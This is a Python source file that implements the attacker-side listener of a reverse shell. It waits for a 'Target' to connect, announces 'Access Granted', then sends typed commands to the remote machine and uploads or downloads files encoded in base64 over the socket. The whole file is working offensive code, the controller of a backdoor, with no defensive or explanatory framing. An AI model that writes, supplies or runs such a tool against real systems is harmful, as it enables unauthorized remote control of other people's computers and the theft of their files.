import socket,time,colorama,json,base64

class Listener:

    def __init__(self,ip,port):
        sp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sp.bind((ip,port))
        sp.listen(1)
        print(colorama.Fore.RED + "[+] Waiting for the Target...")
        self.connection, address = sp.accept()
        print(colorama.Fore.GREEN  + "[+] Access Granted! ["+str(address)+"] has been targeted!")

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        data = "".encode()
        while True:
            try:
                data = data + self.connection.recv(1024)
                return json.loads(data)
            except:
                continue

    def read_file(self,path):
        with open(path,"rb") as f:
            return base64.b64encode(f.read()).decode()
        
    def write_file(self,path,content):
        with open(path,"wb") as f:
            f.write(base64.decodebytes(content))
            return "[+] Download Successful"
    
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0].lower() == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split()
            try:                 
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-]" not in result:
                    result = self.write_file(command[1],result.encode())
            except Exception as e:
                result = "[-] Error Processing\n" + str(e)
            
            print(result)
            
colorama.init()        
listen = Listener("127.0.0.1",5657)
listen.run()
